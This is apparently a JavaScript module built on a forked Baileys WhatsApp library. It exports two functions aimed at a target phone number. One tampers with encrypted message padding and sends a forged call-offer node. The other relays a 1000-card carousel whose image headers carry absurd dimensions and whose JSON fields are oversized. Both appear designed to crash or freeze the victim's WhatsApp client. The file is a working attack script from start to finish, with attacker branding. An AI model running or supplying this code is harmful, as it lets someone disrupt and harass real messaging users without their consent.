const {
default: baileys,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
getContentType,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
WAContextInfo,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
GroupSettingChange,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header,
encodeSignedDeviceIdentity,
generateMessageID,
encodeWAMessage,
useMultiFileAuthState,
DiskatsumiectReason,
fetchLatestBaileysVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
prepareWAMessageContent,
generateWAMessageFromContent,
makeInMemoryStore,
jidDecode,
proto,
getAggregateVotesInPollMessage,
makeCacheableSignalKeyStore,
Browsers,
decryptMessageNode,
MessageRetryMap,
} = require("@purpleiriss/irisbail");
const crypto = require('crypto')

exports.everlynx = async (katsumi, zzzzzz) => {
    let devices = (
        await katsumi.getUSyncDevices([zzzzzz], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await katsumi.assertSessions(devices)

    let katsumitsx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = katsumitsx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = katsumi.createParticipantNodes.bind(katsumi);
    let yntkts = katsumi.encodeWAMessage?.bind(katsumi);

    katsumi.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (katsumi.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = katsumi.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === omak;
            let y = jid === meId || jid === meLid;
            if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

            let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

            return memek.mutex(jid, async () => {
                let { type, ciphertext } = await katsumi.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await katsumi.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let lemiting = {
        tag: "call",
        attrs: { to: zzzzzz, id: katsumi.generateMessageTag(), from: katsumi.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": katsumi.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity ? [{
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(katsumi.authState.creds.account, true)
                }] : [])
            ]
        }]
    };

    await katsumi.sendNode(lemiting);
}

exports.katsumitsx = async (katsumi, target) => {
    let x = []

    for (let r = 0; r < 1000; r++) {
        x.push({
            body: { text: "Bury your head" },
            footer: { text: "katsumi.⧉ division" },
            header: {
                imageMessage: {
                    "url": "https://mmg.whatsapp.net/v/t62.7118-24/521849368_1606046530711378_826171097272642629_n.enc?ccb=11-4&oh=01_Q5Aa3QFqWy-uEPL481oPxV825PgPHJTcsMj33viO9WDOg3fTfA&oe=69607160&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/jpeg",
                    "fileSha256": "aCd2/uM2EFTZvTOFiZzzIfpa70s1dphBhAj7tenH8Ng=",
                    "fileLength": "89625",
                    "height": 99999999999999,
                    "width": -99999,
                    "mediaKey": "KqkNVgI/PgrFfGgKzox6mCVObgsl3LVYCWo9HlAbdCI=",
                    "fileEncSha256": "CFISaxEOR7JRy6GSC4BHnX4lVr2yFpuAvI43DPmpDMg=",
                    "directPath": "/v/t62.7118-24/521849368_1606046530711378_826171097272642629_n.enc?ccb=11-4&oh=01_Q5Aa3QFqWy-uEPL481oPxV825PgPHJTcsMj33viO9WDOg3fTfA&oe=69607160&_nc_sid=5e03e0",
                    "mediaKeyTimestamp": "1765347812",
                },
                hasMediaAttachment: true
            },
            "nativeFlowMessage": {
                "buttons": [],
                "messageParamsJson": "{\"limited_time_offer\":{\"text\":\"▸ 𝐊⃰𝐚 𝐭 𝐬͢ 𝐮͢𝐦͢𝐈 ᱺ⿻ᱺ 𝐄⃰𝐂͢𝐇🩸⃑ ◂\",\"url\":\"t.me/katsumi.exposed\",\"copy_code\":\"▸ 𝐊⃰𝐚 𝐭 𝐬͢ 𝐮͢𝐦͢𝐈 ᱺ⿻ᱺ 𝐄⃰𝐂͢𝐇🩸◂\",\"expiration_time\":0},\"bottom_sheet\":{\"in_thread_buttons_limit\":2,\"divider_indices\":[1,2,3,4,5, 999],\"list_title\":\"▸ 𝐊⃰𝐚 𝐭 𝐬͢ 𝐮͢𝐦͢𝐈 ᱺ⿻ᱺ 𝐄⃰𝐂͢𝐇🩸◂\",\"button_title\":\"▸ 𝐊⃰𝐚 𝐭 𝐬͢ 𝐮͢𝐦͢𝐈 ᱺ⿻ᱺ 𝐄⃰𝐂͢𝐇🩸◂\"},\"tap_target_configuration\":{\"title\":\"▸ 𝐊⃰𝐚 𝐭 𝐬͢ 𝐮͢𝐦͢𝐈 ᱺ⿻ᱺ 𝐄⃰𝐂͢𝐇🩸◂\",\"description\":\"bomboclard\",\"canonical_url\":\"x\",\"domain\":\"shop.example.com\",\"button_index\":0}}"
            },
        })
    }

    const msg = await generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "I can tell there was an accident." },
                    footer: { text: "katsumi.⧉ echo" },
                    carouselMessage: { cards: x }
                }
            }
        }
    }, {})

    await katsumi.relayMessage(target, msg.message, { participant: { jid: target } })
}
